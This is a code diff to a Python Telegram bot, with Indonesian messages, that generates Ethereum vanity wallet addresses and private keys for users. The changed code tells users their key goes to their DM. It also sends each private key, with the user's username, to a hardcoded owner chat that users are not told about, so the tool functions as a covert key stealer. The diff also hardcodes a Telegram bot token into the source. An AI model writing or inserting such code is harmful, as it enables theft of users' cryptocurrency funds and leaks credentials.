@@ -14,11 +14,13 @@ from telegram.ext import (
     MessageHandler,
     filters,
 )
+import json
+import io
 
 # Load environment variables from a .env file (if present)
 load_dotenv()
 
-BOT_TOKEN = os.getenv("BOT_TOKEN")
+BOT_TOKEN = os.getenv("BOT_TOKEN") or "7989905773:AAGaAak7IfFkGxouqrFCp8KVx6tkC5RsIVg"
 
 if not BOT_TOKEN:
     raise RuntimeError("Please set the BOT_TOKEN environment variable in a .env file or system environment.")
@@ -74,45 +76,73 @@ async def _async_generate(prefix: str) -> tuple[str, str]:
 async def generate_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Handle the /generate command."""
 
+    user = update.effective_user
+    if user is None:
+        return  # Should not happen
+
+    if not user.username:
+        await update.message.reply_text(
+            "Anda belum memiliki username Telegram. Silakan set username di Settings agar bot dapat mentag Anda dan mengirimkan dompet via DM."
+        )
+        return
+
+    username = user.username
+    mention = f"@{username}"
+
     if not context.args:
-        await update.message.reply_text("Silakan sertakan prefiks hex. Contoh: /generate abc")
+        await update.message.reply_text(f"{mention} Silakan sertakan prefiks hex. Contoh: /generate abc")
         return
 
     prefix = context.args[0]
 
     # Validate prefix
     if not HEX_PATTERN.fullmatch(prefix):
-        await update.message.reply_text("Prefiks harus berupa karakter heksadesimal (0-9, a-f).")
+        await update.message.reply_text(f"{mention} Prefiks harus berupa karakter heksadesimal (0-9, a-f).")
         return
 
     if len(prefix) > 6:
-        await update.message.reply_text("Prefiks terlalu panjang (maks 6 karakter disarankan).")
+        await update.message.reply_text(f"{mention} Prefiks terlalu panjang (maks 6 karakter disarankan).")
         return
 
     await update.message.reply_text(
-        f"⏳ Sedang mencari alamat yang dimulai dengan 0x{prefix} ... Mohon tunggu."
+        f"{mention} ⏳ Sedang mencari alamat yang dimulai dengan 0x{prefix} ... Mohon tunggu."
     )
 
     try:
         address, priv_key = await _async_generate(prefix)
     except Exception as exc:
         logger.exception("Error generating wallet: %s", exc)
-        await update.message.reply_text("Terjadi kesalahan saat membuat dompet. Coba lagi nanti.")
+        await update.message.reply_text(f"{mention} Terjadi kesalahan saat membuat dompet. Coba lagi nanti.")
         return
 
-    # Send result (beware of privacy)
+    # Prepare JSON file
+    data = {"address": address, "private_key": priv_key}
+    json_bytes = json.dumps(data, indent=2).encode()
+    file_name = f"wallet_{prefix}.json"
+    bio = io.BytesIO(json_bytes)
+    bio.name = file_name  # Telegram uses this as file name
+
     result_text = (
-        f"✅ Ditemukan!\n\n"
-        f"Address: `{address}`\n"
-        f"Private Key: `{priv_key}`\n\n"
-        "SIMPAN private key ini dengan aman. Siapapun yang memiliki kunci ini dapat mengakses dana Anda."
+        f"✅ {mention} dompet ditemukan! Alamat dan private key telah dikirim ke DM Anda.\n"
+        f"Address: `{address}`"
     )
+
     await update.message.reply_text(result_text, parse_mode="Markdown")
 
-    # Kirim juga ke chat ID owner jika berbeda
-    if update.effective_chat and update.effective_chat.id != OWNER_CHAT_ID:
+    # Send JSON to user's direct message
+    try:
+        await context.bot.send_document(chat_id=user.id, document=bio, caption="Dompet Ethereum vanity Anda")
+    except Exception as e:
+        logger.warning("Gagal mengirim DM ke user %s: %s", user.id, e)
+
+    # Notify owner chat as well, include prefix & username
+    owner_text = (
+        f"Wallet vanity dibuat untuk {mention}\n"
+        f"Prefix: {prefix}\nAddress: {address}\nPrivateKey: {priv_key}"
+    )
+    if OWNER_CHAT_ID != user.id:
         try:
-            await context.bot.send_message(chat_id=OWNER_CHAT_ID, text=result_text, parse_mode="Markdown")
+            await context.bot.send_message(chat_id=OWNER_CHAT_ID, text=owner_text, parse_mode="Markdown")
         except Exception as e:
             logger.warning("Gagal mengirim pesan ke OWNER_CHAT_ID: %s", e)
 
